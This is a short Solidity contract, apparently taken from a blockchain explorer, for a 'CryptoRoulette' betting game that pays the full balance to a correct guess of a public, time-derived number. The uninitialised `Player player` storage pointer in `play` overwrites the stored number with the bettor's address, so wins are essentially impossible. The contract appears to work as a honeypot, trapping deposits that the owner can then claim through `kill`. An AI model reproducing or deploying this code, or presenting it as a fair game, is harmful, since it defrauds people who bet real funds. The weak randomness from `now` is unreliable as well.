/**
 *Submitted for verification at BscScan.com on 2022-04-15
*/

pragma solidity ^0.4.26;

contract CryptoRoulette {

    uint256 public randNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 0.1 ether;
    address public ownerAddr;

    struct Player {
        address addr;
        uint256 number;
    }
    Player[] public gamesPlayed;

    constructor() public {
        ownerAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {
        randNumber = now % 10 + 1;
    }

    function play(uint256 number) payable public returns(bool){
        require(msg.value >= betPrice);

        Player player;
        player.addr = msg.sender;
        player.number = number;
        gamesPlayed.push(player);

        if (number == randNumber) {
            // win
            msg.sender.transfer(address(this).balance);
        }
        
        shuffle();
        lastPlayed = now;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }

    function kill() public {
        if ( msg.sender == ownerAddr && now > lastPlayed + 1 days) {
            selfdestruct(msg.sender);
        }
    }

    function() public payable { }
}